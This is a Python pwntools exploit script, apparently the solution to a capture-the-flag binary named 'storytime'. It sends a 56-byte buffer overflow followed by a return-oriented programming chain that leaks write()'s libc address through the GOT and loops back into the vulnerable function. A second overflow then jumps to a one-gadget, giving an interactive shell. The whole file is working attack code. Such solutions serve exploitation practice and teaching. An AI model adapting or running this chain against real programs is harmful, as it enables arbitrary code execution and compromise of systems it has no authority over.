from pwn import *

target = process("./storytime", env={"LD_PRELOAD":"./libc.so.6"})
# libc = ELF("libc.so.6")
libc = ELF("./libc.so.6")

POP_RSI_POP_R15_RET = 0x400701
WRITE_GOT = 0x601018
WRITE_PLT = 0x4004a0

payload = b'0' * 56         # junk data to overflow the buffer in main()

payload += p64(POP_RSI_POP_R15_RET)
payload += p64(WRITE_GOT)   # GOT entry address of write(), putting it into RSI will prepare everything for jumping into end() two lines below, and print the actual absolute address of write() from libc in memory
payload += p64(0x3030303030303030)
payload += p64(0x400601)    # instruction in end() function that puts 0x1 into EDI(RDI), calls write(), which will in this case print the (absolute) libc address of write(), giving us infoleak into libc, and pops 8 bytes from stack into RBP
payload += p64(0x3030303030303030)
payload += p64(0x40060e)    # address of climax() function, transferring execution here will allow us to overflow the buffer again

target.sendline(payload)
print(target.recvuntil("Tell me a story: \n"))
leak = u64(target.recv(8))
base = leak - libc.symbols["write"]
print("libc base: " + hex(base))
oneshot = base + 0x4526a
payload2 = b'1' * 56 + p64(oneshot)
target.sendline(payload2)
target.interactive()
